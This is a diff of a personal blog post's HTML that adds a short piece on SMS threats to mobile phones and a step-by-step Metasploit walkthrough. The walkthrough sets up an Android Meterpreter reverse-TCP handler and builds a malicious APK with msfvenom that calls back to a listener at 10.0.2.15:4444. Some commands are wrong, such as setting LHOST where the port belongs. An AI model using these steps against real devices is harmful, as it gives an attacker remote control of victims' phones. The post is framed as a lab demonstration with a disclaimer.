@@ -14,6 +14,7 @@
         <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
         <!-- Core theme CSS (includes Bootstrap)-->
         <link href="css/styles.css" rel="stylesheet" />
+        <link href="css/paraiso-dark.css" rel="stylesheet" type="text/css">
     </head>
     <body>
         <!-- Navigation-->
@@ -44,7 +45,7 @@
                             <span class="meta">
                                 Posted by
                                 <a href="https://github.com/AM-ops">Affaan Muhammad</a>
-                                on October 19, 2021 <br> Read Time: ±10min
+                                on October 19, 2021 <br> Read Time: ± 10min
                             </span>
                         </div>
                     </div>
@@ -56,30 +57,49 @@
             <div class="container px-4 px-lg-5">
                 <div class="row gx-4 gx-lg-5 justify-content-center">
                     <div class="col-md-10 col-lg-8 col-xl-7">
-                        <h1>Worldwide Mobile Operating Systems Market Share</h1>
-                        <div id="mobile+tablet-os_combined-ww-monthly-201706-202108" width="600" height="400" style="width:600px; height: 400px;"></div><!-- You may change the values of width and height above to resize the chart --><p>Source: <a href="https://gs.statcounter.com/os-market-share/mobile-tablet/worldwide/#monthly-201706-202108">StatCounter Global Stats - OS Market Share</a></p><script type="text/javascript" src="https://www.statcounter.com/js/fusioncharts.js"></script><script type="text/javascript" src="https://gs.statcounter.com/chart.php?mobile+tablet-os_combined-ww-monthly-201706-202108&chartWidth=600"></script>
-                        <h1>African Mobile Operating Systems Market Share</h1>
-                        <div id="mobile+tablet-os_combined-af-monthly-201706-202108" width="600" height="400" style="width:600px; height: 400px;"></div><!-- You may change the values of width and height above to resize the chart --><p>Source: <a href="https://gs.statcounter.com/os-market-share/mobile-tablet/africa/#monthly-201706-202108">StatCounter Global Stats - OS Market Share</a></p><script type="text/javascript" src="https://www.statcounter.com/js/fusioncharts.js"></script><script type="text/javascript" src="https://gs.statcounter.com/chart.php?mobile+tablet-os_combined-af-monthly-201706-202108&chartWidth=600"></script>
-                        <p>My reaction is:</p>
-                        <div class="justify-content-center">
-                            <img src="assets/img/umm.gif" class="img-fluid" alt="umm"/></p>
-                        </div>
-                        <h2 class="section-heading">The Final Frontier</h2>
-                        <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it is a task to occupy the generations. And no matter how much progress one makes, there is always the thrill of just beginning.</p>
-                        <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it is a task to occupy the generations. And no matter how much progress one makes, there is always the thrill of just beginning.</p>
+                        <h2>Worldwide Mobile Operating Systems Market Share</h2>
+                        
+                        <h2>African Mobile Operating Systems Market Share</h2>
+                        
+                        <p>Looking at the graphs above my reaction is:</p>
+                        <p><img src="assets/img/umm.gif" class="img-fluid mx-auto d-block" alt="umm"/></p>
+                        <h2>From the Situation Room</h2>
+                        <p>It would be not a long shot to assume that you do own a Mobile device, and you are currently using it to view this blog.</p>
+                        <p>How often have you received a SMS that seemed off, or was something that you would not expect?</p>
+                        <p>Often times SMSs can have malicious links embedded in them, or can contain spam which might compromise your device.</p>
+                        <p>Clicking on such links or installing unknown apps on your device, you might feel like doing this!</p>
+                        <p><img src="assets/img/broken-phone.gif" class="img-fluid mx-auto d-block" alt="break"/></p>
+                        <h2>Onward to the exploit!</h2>
+                        <p>Now on to the actual HACKING!</p>
+                        <p><b style="color: red;">DISCLAIMER:</b> DO NOT TRY THIS AT HOME OR ON PUBLIC NETWORKS!</p>
+                        <p><img src="assets/img/ww.gif" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <h4>Step 1:</h4>
+                        <p>Fire up the Metasploit console by running this command on your Kali Linux VM's terminal</p>
+                        <pre><code data-language="shell">msfconsole</code></pre>
+                        <p>Your terminal should now look something like this</p>
+                        <p><img src="assets/post1pics/msf.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <h4>Step 2:</h4>
+                        <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
+                        <h4>Step 3:</h4>
+                        <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <h4>Step 4:</h4>
+                        <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
+                        <h4>Step 5:</h4>
+                        <pre><code data-language="shell">msf6> show options</code></pre>
+                        <h4>Step 6:</h4>
+                        <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
+                        <h4>Step 7:</h4>
+                        <pre><code data-language="shell">msf6> set LHOST port_number</code></pre>
+                        <h4>Step 8:</h4>
+                        <pre><code data-language="shell">msf6> exploit</code></pre>
+                        <h4>Step 9:</h4>
+                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk</code></pre>
                         <blockquote class="blockquote">The dreams of yesterday are the hopes of today and the reality of tomorrow. Science has not yet mastered prophecy. We predict too much for the next year and yet far too little for the next ten.</blockquote>
-                        <p>Spaceflights cannot be stopped. This is not the work of any one man or even a group of men. It is a historical process which mankind is carrying out in accordance with the natural laws of human development.</p>
-                        <h2 class="section-heading">Reaching for the Stars</h2>
-                        <p>As we got further and further away, it [the Earth] diminished in size. Finally it shrank to the size of a marble, the most beautiful you can imagine. That beautiful, warm, living object looked so fragile, so delicate, that if you touched it with a finger it would crumble and fall apart. Seeing this has to change a man.</p>
-                        <a href="#!"><img class="img-fluid" src="assets/img/post-sample-image.jpg" alt="..." /></a>
-                        <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
-                        <p>Space, the final frontier. These are the voyages of the Starship Enterprise. Its five-year mission: to explore strange new worlds, to seek out new life and new civilizations, to boldly go where no man has gone before.</p>
-                        <p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental truth to our nature, Man must explore, and this is exploration at its greatest.</p>
+                        
                         <p>
-                            Placeholder text by
-                            <a href="http://spaceipsum.com/">Space Ipsum</a>
-                            &middot; Images by
-                            <a href="https://www.flickr.com/photos/nasacommons/">NASA on The Commons</a>
+                            Sources:
+                            &middot; GIFs by
+                            <a href="https://tenor.com/">Tenor</a>
                         </p>
                     </div>
                 </div>
@@ -96,7 +116,8 @@
                                     <span class="fa-stack fa-lg">
                                         <i class="fas fa-circle fa-stack-2x"></i>
                                         <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                                    </span>
+                                    </span><br>
+                                    Josh-SCG
                                 </a>
                             </li>
                             
@@ -105,7 +126,8 @@
                                     <span class="fa-stack fa-lg">
                                         <i class="fas fa-circle fa-stack-2x"></i>
                                         <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                                    </span>
+                                    </span><br>
+                                    AM-ops
                                 </a>
                             </li>
                         </ul>
@@ -118,5 +140,6 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
         <!-- Core theme JS-->
         <script src="js/scripts.js"></script>
+        <script src="js/rainbow-custom.min.js"></script>
     </body>
 </html>
